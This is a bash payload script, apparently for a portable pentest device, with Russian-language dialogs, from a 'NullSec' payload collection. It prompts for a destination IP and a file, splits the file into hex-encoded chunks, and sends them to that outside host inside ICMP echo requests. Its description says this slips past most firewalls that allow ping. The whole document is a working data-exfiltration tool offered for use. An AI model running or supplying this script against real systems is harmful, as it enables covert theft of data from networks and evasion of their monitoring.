#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
. /root/payloads/library/nullsec-ui.sh
# Название: NullSec ICMP Tunnel
# Автор: bad-antics
# Описание: Эксфильтрация данных, закодированных в полезных нагрузках запросов эхо ICMP
# Категория: nullsec

LOOT_DIR="/mmc/nullsec/loot"
mkdir -p "$LOOT_DIR"

PROMPT "ICMP ТУННЕЛЬ
━━━━━━━━━━━━━━━━━━━━━━━━━
Эксфильтруйте данные с помощью
запросов эхо ICMP.

Обходит большинство фаерволов,
которые разрешают ping.

Нажмите OK для настройки."

DEST_IP=$(EDIT_STRING "IP получателя:" "")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
[ -z "$DEST_IP" ] && ERROR_DIALOG "Не указан IP назначения!" && exit 1

SOURCE_FILE=$(EDIT_STRING "Файл для эксфила:" "/tmp/loot.txt")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac

if [ ! -f "$SOURCE_FILE" ]; then
    ERROR_DIALOG "Файл не найден:\n$SOURCE_FILE"
    exit 1
fi

FILE_SIZE=$(wc -c < "$SOURCE_FILE")
CHUNKS=$(( (FILE_SIZE + 48) / 48 ))

resp=$(CONFIRMATION_DIALOG "Конфигурация ICMP эксфила:
━━━━━━━━━━━━━━━━━━━━━━━━━
Назначение: $DEST_IP
Файл: $(basename $SOURCE_FILE)
Размер: ${FILE_SIZE} байт
Чанки: $CHUNKS

НАЧАТЬ?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Эксфильтрация через ICMP..."
SENT=0
FAILED=0

# Разделить файл и отправить как полезные нагрузки ICMP
split -b 48 "$SOURCE_FILE" /tmp/icmp_chunk_ 2>/dev/null

for chunk in /tmp/icmp_chunk_*; do
    DATA=$(xxd -p "$chunk" | tr -d '
')
    ping -c 1 -p "$DATA" -s ${#DATA} "$DEST_IP" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        SENT=$((SENT + 1))
    else
        FAILED=$((FAILED + 1))
    fi
    sleep 0.5
done

rm -f /tmp/icmp_chunk_*
SPINNER_STOP

PROMPT "ICMP ЭКСФИЛ ЗАВЕРШЕН
━━━━━━━━━━━━━━━━━━━━━━━━━
Отправлено: $SENT чанков
Неудачно: $FAILED
Всего: ${FILE_SIZE} байт

Назначение: $DEST_IP"
